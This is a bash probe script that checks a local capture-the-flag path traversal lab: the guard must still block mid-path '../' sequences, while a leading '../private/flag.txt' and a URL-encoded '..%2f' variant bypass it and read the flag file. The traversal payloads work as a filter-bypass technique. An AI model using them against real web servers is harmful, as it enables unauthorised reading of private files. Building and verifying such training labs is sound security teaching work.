#!/usr/bin/env bash
# w17 concat-walk :: self-verifying probe.
#
#   ./probe.sh                       # http://localhost:30017
#   ./probe.sh http://host:port
#
# Asserts the lab is solvable AND that the guard is still doing something
# (an over-eager guard would silently make the lab unsolvable).
set -uo pipefail

BASE="${1:-http://localhost:30017}"
fail=0

check() { # check <label> <expected-substring> <actual>
  if [[ "$3" == *"$2"* ]]; then
    printf '  ok   %s\n' "$1"
  else
    printf '  FAIL %s\n       expected to contain: %s\n       got: %s\n' "$1" "$2" "$3"
    fail=1
  fi
}

get() { curl -s --path-as-is "$BASE$1"; }

printf '[*] target %s\n' "$BASE"

check "landing page serves"          "CONCAT"   "$(get /)"
check "health endpoint"              "concat-walk" "$(get /api/health)"
check "legit file read"              "public drop" "$(get '/dl?f=manifest.txt')"

# The guard must still block the textbook shape, or the lab lost its point.
check "guard blocks a/../b"          "traversal blocked" "$(get '/dl?f=a/../private/flag.txt')"
check "guard blocks x/../../b"       "traversal blocked" "$(get '/dl?f=x/../../private/flag.txt')"

# The exploit: a LEADING traversal, which the guard does not model.
check "leading ../ reads the flag"   "hex4b0t{" "$(get '/dl?f=../private/flag.txt')"
check "encoded slash reads the flag" "hex4b0t{" "$(get '/dl?f=..%2fprivate%2fflag.txt')"

if [[ $fail -eq 0 ]]; then
  printf '\n[+] w17 solvable and guard intact\n'
else
  printf '\n[!] w17 probe FAILED\n'
fi
exit $fail
